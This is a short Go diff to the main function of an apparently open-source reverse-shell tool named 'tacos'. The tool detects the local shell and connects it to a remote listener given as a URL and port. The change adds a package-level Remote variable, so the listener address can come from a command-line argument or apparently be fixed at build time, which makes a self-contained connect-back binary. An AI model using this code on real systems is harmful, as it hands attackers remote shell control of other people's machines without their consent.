@@ -10,6 +10,8 @@ import (
 	"github.com/ariary/tacos/pkg/tacos"
 )
 
+var Remote string
+
 func main() {
 	//var detect, daemon bool
 	var detect bool
@@ -27,12 +29,14 @@ func main() {
 		shell = tacos.DetectDefaultShell()
 	}
 
-	if len(os.Args) < 1 {
+	if len(os.Args) > 1 {
+		Remote = flag.Arg(0)
+	}
+
+	if Remote == "" {
 		fmt.Println("Usage: tacos [listener_url]:[port]")
 		os.Exit(1)
 	}
 
-	remote := flag.Arg(0)
-
-	tacos.ShellReverse(remote, shell)
+	tacos.ShellReverse(Remote, shell)
 }
